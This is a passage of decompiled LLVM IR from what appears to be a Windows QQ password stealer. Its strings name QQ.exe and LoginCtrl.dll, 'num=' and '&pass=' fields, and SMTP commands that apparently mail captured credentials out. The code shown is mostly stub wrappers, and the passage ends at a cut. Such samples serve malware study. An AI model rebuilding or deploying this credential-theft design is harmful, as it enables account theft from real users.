source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404ca0 = local_unnamed_addr constant i32 43
@global_var_404cb8 = constant i32 37
@global_var_404d40 = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4214148
@B64EncodeTable_at_404d84 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_40545c = constant [6 x i8] c"HELO \00"
@global_var_40546c = constant [3 x i8] c"\0D\0A\00"
@global_var_405478 = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405490 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_4054a8 = constant i32 62
@global_var_4054b4 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_4054c8 = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_4054d8 = constant [8 x i8] c"From: <\00"
@global_var_4054e8 = constant [6 x i8] c"To: <\00"
@global_var_4054f8 = constant [10 x i8] c"Subject: \00"
@global_var_40550c = constant i32 46
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_405518 = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_405562 = local_unnamed_addr constant i32 763609949
@global_var_4080ec = local_unnamed_addr global i32 4213092
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = local_unnamed_addr global i32 4212752
@global_var_4080c0 = global i32 0
@global_var_4080e8 = local_unnamed_addr global i32 4213024
@global_var_4080f8 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = global i32 0
@global_var_4080f0 = global i32 4213160
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f4 = global i32 4230401
@global_var_4057a4 = constant [6 x i8] c"Down(\00"
@global_var_4057b4 = constant i32 41
@global_var_4057c0 = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_4057c4 = constant [5 x i8] c"Open\00"
@global_var_4096ac = global i32 0
@global_var_4059f4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_405a00 = constant i32 47
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_40815c = local_unnamed_addr global i32* @global_var_4080f0
@global_var_405a40 = constant [5 x i8] c"num=\00"
@global_var_405a50 = constant [7 x i8] c"&pass=\00"
@global_var_405b0c = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_405b1c = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_408140 = external local_unnamed_addr global i32
@global_var_405de0 = constant [9 x i8] c"ComboBox\00"
@global_var_408144 = local_unnamed_addr global i32* @global_var_409670
@global_var_408130 = external local_unnamed_addr global i32
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_406040 = constant [7 x i8] c"#32770\00"
@global_var_406050 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_40609c = local_unnamed_addr constant i32 4219040
@global_var_4060a0 = local_unnamed_addr constant i32 841875985
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4219332
@global_var_40812c = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080c8
@global_var_4063c0 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_40814c = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_4065a8 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4065b8 = constant [8 x i8] c"ListBox\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_409668
@global_var_4065c0 = constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_406694 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_406698 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_40810c = global i32 1
@global_var_4066b4 = constant [10 x i8] c"First Run\00"
@global_var_406770 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_40678c = constant [10 x i8] c"First Run\00"
@global_var_40813c = local_unnamed_addr global i32* @global_var_4080c0
@global_var_406838 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406848 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_408154 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406ab0 = local_unnamed_addr constant [11 x i8] c"xiaran.obj\00"
@global_var_406ac4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406ad0 = local_unnamed_addr constant i32 47
@global_var_4068bc = local_unnamed_addr constant i32 4221120
@global_var_4068c0 = local_unnamed_addr constant i32 841875985
@global_var_406bf0 = local_unnamed_addr constant [10 x i8] c"rejoi.obj\00"
@global_var_406c04 = constant i32 47
@global_var_406c10 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_4071e8 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407294 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40741c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408168 = local_unnamed_addr global i32* @global_var_4080f4
@global_var_407428 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408124 = local_unnamed_addr global i32* @global_var_4096ac
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407908 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40792c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_4079c0 = constant [11 x i8] c"user32.dll\00"
@global_var_4079cc = constant [11 x i8] c"LoadImageA\00"
@global_var_4079d8 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_4075b8 = local_unnamed_addr constant i32 4224516
@global_var_407604 = local_unnamed_addr constant i32 1867011080
@global_var_4079e8 = constant [12 x i8] c"LoadStringA\00"
@global_var_4079f4 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a00 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a0c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a1c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_408111 = local_unnamed_addr global i32 0
@global_var_4096f8 = local_unnamed_addr global i32 0
@global_var_407ab8 = local_unnamed_addr constant i32 31
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_407e50 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407e60 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e78 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_40811c = local_unnamed_addr global i32 0
@global_var_407e90 = local_unnamed_addr constant [13 x i8] c"Explorer.Exe\00"
@global_var_407ea0 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407eb0 = constant [8 x i8] c"ListBox\00"
@global_var_40980c = global i32 0
@global_var_407ec0 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096fc = external global i8*

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @Randomize() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@AStrCmp"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

declare i32 @"@_CToPasStr"() local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

